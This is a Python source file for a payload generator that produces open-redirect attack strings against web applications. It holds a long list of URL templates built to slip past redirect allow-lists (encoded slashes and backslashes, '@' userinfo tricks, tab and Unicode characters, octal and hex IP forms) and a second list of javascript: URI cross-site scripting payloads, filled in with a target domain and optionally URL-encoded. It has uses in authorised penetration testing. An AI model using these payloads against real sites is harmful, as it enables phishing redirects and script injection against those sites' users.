import urllib.parse


class OpenRedirectionPayloadGenerator():
    def __init__(self):
        self.payload_templates = [
            "/〱DOMAIN",
            "〱DOMAIN",
            "/〵DOMAIN",
            "〵DOMAIN",
            "/ゝDOMAIN",
            "ゝDOMAIN",
            "/ーDOMAIN",
            "ーDOMAIN",
            "/ｰDOMAIN",
            "ｰDOMAIN",
            "/%09/DOMAIN",
            "//%09/DOMAIN",
            "///%09/DOMAIN",
            "////%09/DOMAIN",
            "/%09/DOMAIN@DOMAIN",
            "//%09/DOMAIN@DOMAIN",
            "///%09/DOMAIN@DOMAIN",
            "////%09/DOMAIN@DOMAIN",
            "/%09/WHITELISTED@DOMAIN",
            "//%09/WHITELISTED@DOMAIN",
            "///%09/WHITELISTED@DOMAIN",
            "////%09/WHITELISTED@DOMAIN",
            "%19Jav%09asc%09ript:https%20://WHITELISTED/%250Aconfirm%25281%2529",
            "/%2f%2fDOMAIN",
            "//%2fxDOMAIN",
            "//3H6k7lIAiqjfNeN@DOMAIN+@DOMAIN/",
            "//3H6k7lIAiqjfNeN@DOMAIN@DOMAIN/",
            "//3H6k7lIAiqjfNeN@WHITELISTED+@DOMAIN/",
            "//3H6k7lIAiqjfNeN@WHITELISTED@DOMAIN/",
            "/%5cDOMAIN",
            "//%5cDOMAIN",
            "///%5cDOMAIN",
            "////%5cDOMAIN",
            "/%5cDOMAIN@DOMAIN",
            "//%5cDOMAIN@DOMAIN",
            "///%5cDOMAIN@DOMAIN",
            "////%5cDOMAIN@DOMAIN",
            "/%5cWHITELISTED@DOMAIN",
            "//%5cWHITELISTED@DOMAIN",
            "///%5cWHITELISTED@DOMAIN",
            "////%5cWHITELISTED@DOMAIN",
            ".DOMAIN",
            "/.DOMAIN",
            "/////DOMAIN",
            "/////DOMAIN/",
            "////\\;@DOMAIN",
            "////DOMAIN/",
            "////DOMAIN//",
            "///\\;@DOMAIN",
            "///DOMAIN",
            "///DOMAIN/",
            "///DOMAIN//",
            "//;@DOMAIN",
            "//DOMAIN",
            "//DOMAIN/",
            "//DOMAIN//",
            "/<>//DOMAIN",
            "/\\/\\/DOMAIN/",
            "/\\/DOMAIN/",
            "<>//DOMAIN",
            "@DOMAIN",
            "\\/\\/DOMAIN/",
            "////DOMAIN/%2e%2e",
            "///DOMAIN/%2e%2e",
            "//DOMAIN/%2e%2e",
            "////DOMAIN/%2e%2e%2f",
            "///DOMAIN/%2e%2e%2f",
            "//DOMAIN/%2e%2e%2f",
            "////DOMAIN/%2f..",
            "///DOMAIN/%2f..",
            "//DOMAIN/%2f..",
            "////DOMAIN/%2f%2e%2e",
            "///DOMAIN/%2f%2e%2e",
            "//DOMAIN/%2f%2e%2e",
            "/DOMAIN/%2f%2e%2e",
            "//DOMAIN:80#@DOMAIN/",
            "//DOMAIN:80?@DOMAIN/",
            "//DOMAIN:80#@WHITELISTED/",
            "//DOMAIN:80?@WHITELISTED/",
            "////DOMAIN@DOMAIN/",
            "////DOMAIN@DOMAIN//",
            "///DOMAIN@DOMAIN/",
            "///DOMAIN@DOMAIN//",
            "//DOMAIN@DOMAIN/",
            "//DOMAIN@DOMAIN//",
            "//DOMAIN\\@DOMAIN",
            "////DOMAIN@DOMAIN/%2e%2e",
            "///DOMAIN@DOMAIN/%2e%2e",
            "////DOMAIN@DOMAIN/%2e%2e%2f",
            "///DOMAIN@DOMAIN/%2e%2e%2f",
            "//DOMAIN@DOMAIN/%2e%2e%2f",
            "////DOMAIN@DOMAIN/%2f..",
            "///DOMAIN@DOMAIN/%2f..",
            "//DOMAIN@DOMAIN/%2f..",
            "////DOMAIN@DOMAIN/%2f%2e%2e",
            "///DOMAIN@DOMAIN/%2f%2e%2e",
            "//DOMAIN@DOMAIN/%2f%2e%2e",
            "//DOMAIN+&@DOMAIN#+@DOMAIN/",
            "//DOMAIN@https:///DOMAIN/%2e%2e",
            "//DOMAIN\tDOMAIN/",
            "//DOMAIN\tWHITELISTED/",
            "//DOMAIN\\@WHITELISTED",
            "http://3H6k7lIAiqjfNeN@DOMAIN+@DOMAIN/",
            "http://3H6k7lIAiqjfNeN@DOMAIN@DOMAIN/",
            "http://3H6k7lIAiqjfNeN@WHITELISTED+@DOMAIN/",
            "http://3H6k7lIAiqjfNeN@WHITELISTED@DOMAIN/",
            "/http://DOMAIN",
            "/http:/DOMAIN",
            "http://.DOMAIN",
            "http://;@DOMAIN",
            "http://DOMAIN@00330.00072.0000326.00000316",
            "http:DOMAIN@00330.00072.0000326.00000316",
            "http://DOMAIN@00330.0x3a.54990",
            "http:DOMAIN@00330.0x3a.54990",
            "http://DOMAIN@00330.3856078",
            "http:DOMAIN@00330.3856078",
            "http://DOMAIN@0330.072.0326.0316",
            "http:DOMAIN@0330.072.0326.0316",
            "http://DOMAIN@0xd8.072.54990",
            "http:DOMAIN@0xd8.072.54990",
            "http://DOMAIN@0xd8.0x3a.0xd6.0xce",
            "http:DOMAIN@0xd8.0x3a.0xd6.0xce",
            "http://DOMAIN@0xd8.3856078",
            "http:DOMAIN@0xd8.3856078",
            "http://DOMAIN@0xd83ad6ce",
            "http:DOMAIN@0xd83ad6ce",
            "http://DOMAIN@[::216.58.214.206]",
            "http:DOMAIN@[::216.58.214.206]",
            "http://DOMAIN%23.DOMAIN/",
            "http://DOMAIN%23.WHITELISTED/",
            "http://DOMAIN%2eDOMAIN/",
            "http://DOMAIN%2f%2f.DOMAIN/",
            "http://DOMAIN%2f%2f.WHITELISTED/",
            "http://DOMAIN@3627734734",
            "http:DOMAIN@3627734734",
            "http://DOMAIN%3F.DOMAIN/",
            "http://DOMAIN%3F.WHITELISTED/",
            "http://DOMAIN@472.314.470.462",
            "http:DOMAIN@472.314.470.462",
            "http://DOMAIN%5c%5c.DOMAIN/",
            "http://DOMAIN%5c%5c.WHITELISTED/",
            "http://DOMAIN:80%40DOMAIN/",
            "http://DOMAIN:80#@DOMAIN/",
            "http://DOMAIN:80?@DOMAIN/",
            "http://DOMAIN:80#@WHITELISTED/",
            "http://DOMAIN:80?@WHITELISTED/",
            "http://DOMAIN+&@DOMAIN#+@DOMAIN/",
            "http://DOMAIN@[::ffff:216.58.214.206]",
            "http:DOMAIN@[::ffff:216.58.214.206]",
            "http://DOMAIN\tDOMAIN/",
            "http://DOMAIN\tWHITELISTED/",
            "/https://%09/DOMAIN",
            "https://%09/DOMAIN",
            "https://%09/DOMAIN@DOMAIN",
            "https://%09/WHITELISTED@DOMAIN",
            "/https:/%5cDOMAIN/",
            "/https://%5cDOMAIN",
            "https://%5cDOMAIN",
            "/https://%5cDOMAIN@DOMAIN",
            "https://%5cDOMAIN@DOMAIN",
            "/https://%5cWHITELISTED@DOMAIN",
            "https://%5cWHITELISTED@DOMAIN",
            "//https://DOMAIN//",
            "/https://DOMAIN",
            "/https://DOMAIN/",
            "/https://DOMAIN//",
            "/https:DOMAIN",
            "https://DOMAIN",
            "https://DOMAIN/",
            "https://DOMAIN//",
            "https:DOMAIN",
            "//https:///DOMAIN/%2e%2e",
            "/https:///DOMAIN/%2e%2e",
            "/https://DOMAIN/%2e%2e",
            "https:///DOMAIN/%2e%2e",
            "//https://DOMAIN/%2e%2e%2f",
            "/https://DOMAIN/%2e%2e%2f",
            "https://DOMAIN/%2e%2e%2f",
            "/https://DOMAIN/%2f..",
            "https://DOMAIN/%2f..",
            "/https:///DOMAIN/%2f%2e%2e",
            "/https://DOMAIN/%2f%2e%2e",
            "https:///DOMAIN/%2f%2e%2e",
            "https://DOMAIN/%2f%2e%2e",
            "//https://DOMAIN@DOMAIN//",
            "/https://DOMAIN@DOMAIN/",
            "https://:@DOMAIN\\@DOMAIN",
            "https://DOMAIN@DOMAIN",
            "https://DOMAIN@DOMAIN/",
            "https://DOMAIN@DOMAIN//",
            "/https://DOMAIN@DOMAIN/%2e%2e",
            "https:///DOMAIN@DOMAIN/%2e%2e",
            "//https://DOMAIN@DOMAIN/%2e%2e%2f",
            "https://DOMAIN@DOMAIN/%2e%2e%2f",
            "/https://DOMAIN@DOMAIN/%2f..",
            "https://DOMAIN@DOMAIN/%2f..",
            "/https:///DOMAIN@DOMAIN/%2f%2e%2e",
            "/https://DOMAIN@DOMAIN/%2f%2e%2e",
            "https:///DOMAIN@DOMAIN/%2f%2e%2e",
            "https://DOMAIN@DOMAIN/%2f%2e%2e",
            "https://DOMAIN/https://DOMAIN/",
            "https://:@\\@WHITELISTED",
            "//https://WHITELISTED@DOMAIN//",
            "/https://WHITELISTED@DOMAIN/",
            "https://WHITELISTED@DOMAIN",
            "https://WHITELISTED@DOMAIN/",
            "https://WHITELISTED@DOMAIN//",
            "/https://WHITELISTED@DOMAIN/%2e%2e",
            "https:///WHITELISTED@DOMAIN/%2e%2e",
            "//https://WHITELISTED@DOMAIN/%2e%2e%2f",
            "https://WHITELISTED@DOMAIN/%2e%2e%2f",
            "/https://WHITELISTED@DOMAIN/%2f..",
            "https://WHITELISTED@DOMAIN/%2f..",
            "/https:///WHITELISTED@DOMAIN/%2f%2e%2e",
            "/https://WHITELISTED@DOMAIN/%2f%2e%2e",
            "https:///WHITELISTED@DOMAIN/%2f%2e%2e",
            "https://WHITELISTED@DOMAIN/%2f%2e%2e",
            "https://WHITELISTED/https://DOMAIN/",
            "https://WHITELISTED/https://www.DOMAIN/",
            "/https://WHITELISTED@www.DOMAIN/%2e%2e",
            "https:///WHITELISTED@www.DOMAIN/%2e%2e",
            "//https://WHITELISTED@www.DOMAIN/%2e%2e%2f",
            "https://WHITELISTED@www.DOMAIN/%2e%2e%2f",
            "/https:///WHITELISTED@www.DOMAIN/%2f%2e%2e",
            "/https://WHITELISTED@www.DOMAIN/%2f%2e%2e",
            "https:///WHITELISTED@www.DOMAIN/%2f%2e%2e",
            "https://WHITELISTED@www.DOMAIN/%2f%2e%2e",
            "//https:///www.DOMAIN/%2e%2e",
            "/https://www.DOMAIN/%2e%2e",
            "https:///www.DOMAIN/%2e%2e",
            "//https://www.DOMAIN/%2e%2e%2f",
            "https://www.DOMAIN/%2e%2e%2f",
            "/https:///www.DOMAIN/%2f%2e%2e",
            "/https://www.DOMAIN/%2f%2e%2e",
            "https:///www.DOMAIN/%2f%2e%2e",
            "https://www.DOMAIN/%2f%2e%2e",
            "http://WHITELISTED@00330.00072.0000326.00000316",
            "http:WHITELISTED@00330.00072.0000326.00000316",
            "http://WHITELISTED@00330.0x3a.54990",
            "http:WHITELISTED@00330.0x3a.54990",
            "http://WHITELISTED@00330.3856078",
            "http:WHITELISTED@00330.3856078",
            "http://WHITELISTED@0330.072.0326.0316",
            "http:WHITELISTED@0330.072.0326.0316",
            "http://WHITELISTED@0xd8.072.54990",
            "http:WHITELISTED@0xd8.072.54990",
            "http://WHITELISTED@0xd8.0x3a.0xd6.0xce",
            "http:WHITELISTED@0xd8.0x3a.0xd6.0xce",
            "http://WHITELISTED@0xd8.3856078",
            "http:WHITELISTED@0xd8.3856078",
            "http://WHITELISTED@0xd83ad6ce",
            "http:WHITELISTED@0xd83ad6ce",
            "http://WHITELISTED@[::216.58.214.206]",
            "http:WHITELISTED@[::216.58.214.206]",
            "http://WHITELISTED%2eDOMAIN/",
            "http://WHITELISTED@3627734734",
            "http:WHITELISTED@3627734734",
            "http://WHITELISTED@472.314.470.462",
            "http:WHITELISTED@472.314.470.462",
            "http://WHITELISTED:80%40DOMAIN/",
            "http://WHITELISTED+&@DOMAIN#+@WHITELISTED/",
            "http://WHITELISTED@[::ffff:216.58.214.206]",
            "http:WHITELISTED@[::ffff:216.58.214.206]",
            "http://www.DOMAIN\\.WHITELISTED",
            "http://XY>.7d8T\205pZM@DOMAIN+@DOMAIN/",
            "http://XY>.7d8T\205pZM@DOMAIN@DOMAIN/",
            "http://XY>.7d8T\205pZM@WHITELISTED+@DOMAIN/",
            "http://XY>.7d8T\205pZM@WHITELISTED@DOMAIN/",
            "javascript://DOMAIN?%a0alert%281%29",
            "javascript://https://DOMAIN/?z=%0Aalert(1)",
            "javascript://https://WHITELISTED/?z=%0Aalert(1)",
            "jaVAscript://WHITELISTED//%0d%0aalert(1);//",
            "javascript://WHITELISTED?%a0alert%281%29",
            "////WHITELISTED@DOMAIN/",
            "////WHITELISTED@DOMAIN//",
            "///WHITELISTED@DOMAIN/",
            "///WHITELISTED@DOMAIN//",
            "//WHITELISTED@DOMAIN/",
            "//WHITELISTED@DOMAIN//",
            "////WHITELISTED@DOMAIN/%2e%2e",
            "///WHITELISTED@DOMAIN/%2e%2e",
            "////WHITELISTED@DOMAIN/%2e%2e%2f",
            "///WHITELISTED@DOMAIN/%2e%2e%2f",
            "//WHITELISTED@DOMAIN/%2e%2e%2f",
            "////WHITELISTED@DOMAIN/%2f..",
            "///WHITELISTED@DOMAIN/%2f..",
            "//WHITELISTED@DOMAIN/%2f..",
            "////WHITELISTED@DOMAIN/%2f%2e%2e",
            "///WHITELISTED@DOMAIN/%2f%2e%2e",
            "//WHITELISTED@DOMAIN/%2f%2e%2e",
            "//WHITELISTED+&@DOMAIN#+@WHITELISTED/",
            "//WHITELISTED@https:///DOMAIN/%2e%2e",
            "//WHITELISTED@https:///www.DOMAIN/%2e%2e",
            "////WHITELISTED@www.DOMAIN/%2e%2e",
            "///WHITELISTED@www.DOMAIN/%2e%2e",
            "////WHITELISTED@www.DOMAIN/%2e%2e%2f",
            "///WHITELISTED@www.DOMAIN/%2e%2e%2f",
            "//WHITELISTED@www.DOMAIN/%2e%2e%2f",
            "////WHITELISTED@www.DOMAIN/%2f%2e%2e",
            "///WHITELISTED@www.DOMAIN/%2f%2e%2e",
            "//WHITELISTED@www.DOMAIN/%2f%2e%2e",
            "////www.DOMAIN/%2e%2e",
            "///www.DOMAIN/%2e%2e",
            "////www.DOMAIN/%2e%2e%2f",
            "///www.DOMAIN/%2e%2e%2f",
            "//www.DOMAIN/%2e%2e%2f",
            "////www.DOMAIN/%2f%2e%2e",
            "///www.DOMAIN/%2f%2e%2e",
            "//www.DOMAIN/%2f%2e%2e",
            "//XY>.7d8T\205pZM@DOMAIN+@DOMAIN/",
            "//XY>.7d8T\205pZM@DOMAIN@DOMAIN/",
            "//XY>.7d8T\205pZM@WHITELISTED+@DOMAIN/",
            "//XY>.7d8T\205pZM@WHITELISTED@DOMAIN/",
        ]

        self.xss_payloads = [
            "javascript:confirm(UNIQUE)",
            "java%0d%0ascript%0d%0a:confirm(UNIQUE)",
            "javascript://%250Aconfirm(UNIQUE)",
            "javascript://%250Aconfirm(UNIQUE)//?1",
            "javascript://%250A1?confirm(UNIQUE):0",
            "%09Jav%09ascript:confirm(UNIQUE)",
            "/%09/javascript:confirm(UNIQUE)",
            "/%09/javascript:confirm(UNIQUE);",
            "/%5cjavascript:confirm(UNIQUE)",
            "/%5cjavascript:confirm(UNIQUE);",
            "//%5cjavascript:confirm(UNIQUE)",
            "//%5cjavascript:confirm(UNIQUE);",
            "javascript://%0aconfirm(UNIQUE)",
            "javascript://%250Aprompt(UNIQUE)",
            "//javascript:confirm(UNIQUE)",
            "//javascript:confirm(UNIQUE);",
            "/javascript:confirm(UNIQUE)",
            "/javascript:confirm(UNIQUE);",
            "<>javascript:confirm(UNIQUE);",
            "\\j\\av\\a\\s\\cr\\i\\pt\\:\\p\\ro\\mpt\\(UNIQUE)",
            "javascript:confirm(UNIQUE)",
            "javascript:confirm(UNIQUE);",
            "javascripT://anything%0D%0A%0D%0Awindow.confirm(UNIQUE)",
            "javascript:confirm(UNIQUE)",
            "javascript://https://DOMAIN/?z=%0Aconfirm(UNIQUE)",
            "javascript:prompt(UNIQUE)",
            "jaVAscript://DOMAIN//%0d%0aconfirm(UNIQUE);//",
            "javascript://DOMAIN?%a0confirm%281%29",
            "/x:1/:///%01javascript:confirm(UNIQUE)/",
        ] 

        self.domain = ""
        self.whitelisted = "localhost"
        self.url_encode = False
        self.unique_string = ""

    def generate_payloads(self):
        payloads = [t.replace("DOMAIN",self.domain).replace("WHITELISTED",self.whitelisted) for t in self.payload_templates]

        if self.url_encode:
            encoded = [urllib.parse.quote(p) for p in payloads]
            payloads.extend(encoded)
        return payloads
    
    def generate_xss_payloads(self):
        payloads = [t.replace("DOMAIN",self.domain).replace("UNIQUE",self.unique_string) for t in self.xss_payloads]

        if self.url_encode:
            encoded = [urllib.parse.quote(p) for p in payloads]
            payloads.extend(encoded)
        return payloads